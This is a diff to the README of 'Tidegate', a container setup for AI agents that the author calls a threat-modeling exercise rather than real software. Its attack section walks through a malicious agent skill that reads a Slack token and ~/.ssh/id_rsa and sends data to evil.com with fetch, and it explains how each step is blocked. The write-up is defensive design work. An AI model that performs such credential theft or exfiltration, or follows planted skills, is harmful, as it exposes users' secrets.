@@ -2,6 +2,8 @@
 
 A secure deployment platform for AI agents. Install Tidegate instead of installing an agent framework directly — you get the same agent (OpenClaw, etc.) pre-configured inside a container topology that prevents credential theft, blocks unauthorized network access, and scans all outbound data for sensitive patterns.
 
+> HUMANS NOTE: This is NOT an actual piece of software; it is an architectural exploration and exercise in threat modeling that would be great if someone else built, or that I may get around to trying to actualize someday.
+
 ## What attacks does this stop?
 
 **A malicious ClawHub skill tries to steal your credentials.** The skill calls `process.env.SLACK_TOKEN` — but no credentials exist in the agent container. They live in MCP server containers on a separate network. The skill tries `fetch("https://evil.com/exfil")` — blocked, because the agent-proxy only allows traffic to explicitly allowlisted domains. The skill reads `~/.ssh/id_rsa` — there's nothing there, SSH keys aren't mounted. ([ClawHavoc](docs/threat-model/incidents.md): 1,184 malicious skills, 42K+ affected users.)
